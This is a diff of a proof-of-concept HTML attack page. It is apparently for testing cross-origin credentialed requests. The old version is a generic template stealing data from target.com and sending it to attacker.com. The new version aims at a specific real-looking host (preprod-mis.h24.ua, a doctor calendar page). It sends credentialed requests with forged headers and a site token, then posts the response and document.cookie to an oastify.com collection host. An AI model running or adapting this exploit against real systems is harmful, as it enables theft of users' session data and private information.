@@ -1,35 +1,56 @@
 <!DOCTYPE html>
 <!-- Attacker's page at https://evil.com -->
 <html>
+
 <body>
-<h1>Loading...</h1>
-<script>
-// Victim visits this page while logged into target.com
-fetch('https://target.com/api/user/profile', {
-  credentials: 'include'  // Send cookies
-})
-.then(response => response.json())
-.then(data => {
-  // Steal sensitive data
-  console.log('Stolen data:', data);
-  
-  // Send to attacker's server
-  fetch('https://attacker.com/collect', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-      victim_data: data,
-      cookies: document.cookie
+  <h1>Loading...</h1>
+  <script>
+    // Victim visits this page while logged into target.com
+    fetch('https://preprod-mis.h24.ua/cdn-cgi/rum', {
+      credentials: 'include',
+      method: 'POST',
+      headers: {
+        'Host': 'preprod-mis.h24.ua',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
+        'Accept': '*/*',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Content-Type': 'application/json',
+        'Referer': 'https://preprod-mis.h24.ua/',
+        'Content-Length': '137',
+        'Origin': 'https://ident.me',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'Priority': 'u=4',
+        'Te': 'trailers'
+      },
+      body: JSON.stringify({
+        'eventType': 1,
+        'location': 'https://preprod-mis.h24.ua/new/profile/doctor/calendar',
+        'siteToken': '25de1b372bca4235b4a28ac0ef7f5488',
+        'st': 2
+      })
     })
-  });
-  
-  // Optional: redirect to hide attack
-  setTimeout(() => {
-    window.location = 'https://target.com';
-  }, 500);
-});
-</script>
+      .then(response => response.json())
+      .then(data => {
+        // Steal sensitive data
+        console.log('Stolen data:', data);
+
+        // Send to attacker's server
+        fetch('https://q0rf6zwhzx2v5x12stz2nc51ys4js9gy.oastify.com', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            victim_data: data,
+            cookies: document.cookie
+          })
+        });
+
+      });
+  </script>
 </body>
+
 </html>
